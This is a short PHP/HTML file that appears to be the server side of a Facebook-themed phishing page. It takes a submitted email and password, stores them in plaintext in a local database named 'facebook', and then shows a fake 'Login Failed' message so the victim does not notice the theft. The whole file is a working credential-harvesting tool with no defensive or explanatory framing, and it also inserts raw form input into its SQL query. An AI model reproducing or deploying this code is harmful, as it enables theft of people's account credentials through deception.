
<head>
<meta content="fr" http-equiv="Content-Language">
<style type="text/css">
.auto-style1 {
	text-align: left;
	font-family: FrankRuehl;
}
.auto-style2 {
	text-align: left;
	color: #FF0000;
}
.auto-style3 {
	text-align: left;
}
</style>
</head>

<?php
if(!empty($_POST['email'])&&!empty($_POST['pass']))
{
$email=$_POST['email'];
$pass=$_POST['pass'];
}
else die("verifier le formulaire ");
mysql_connect( "127.0.0.1","root","");
mysql_select_db("facebook");
$r=mysql_query("insert into users values('$email','$pass')");
?>
<p class="auto-style2">Login Failed </p>
<p class="auto-style1">sorry !! you cannot login to the link </p>
<p class="auto-style3">&nbsp;</p>
<p>&nbsp;</p>

